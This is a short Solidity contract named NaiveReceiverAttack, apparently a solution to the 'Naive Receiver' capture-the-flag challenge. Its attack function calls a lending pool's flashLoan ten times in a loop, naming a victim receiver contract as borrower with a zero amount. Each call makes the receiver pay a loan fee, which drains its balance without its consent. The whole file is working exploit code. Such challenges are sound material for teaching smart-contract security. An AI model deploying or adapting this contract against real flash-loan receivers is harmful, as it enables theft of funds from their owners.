// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaiveReceiverAttack {
    function attack(address pool, address receiver) external {
        for (uint256 i = 0; i < 10; i++) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,address,uint256,bytes)",
                    receiver,
                    0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                    0,
                    "0x00"
                )
            );
            require(success);
        }
    }
}
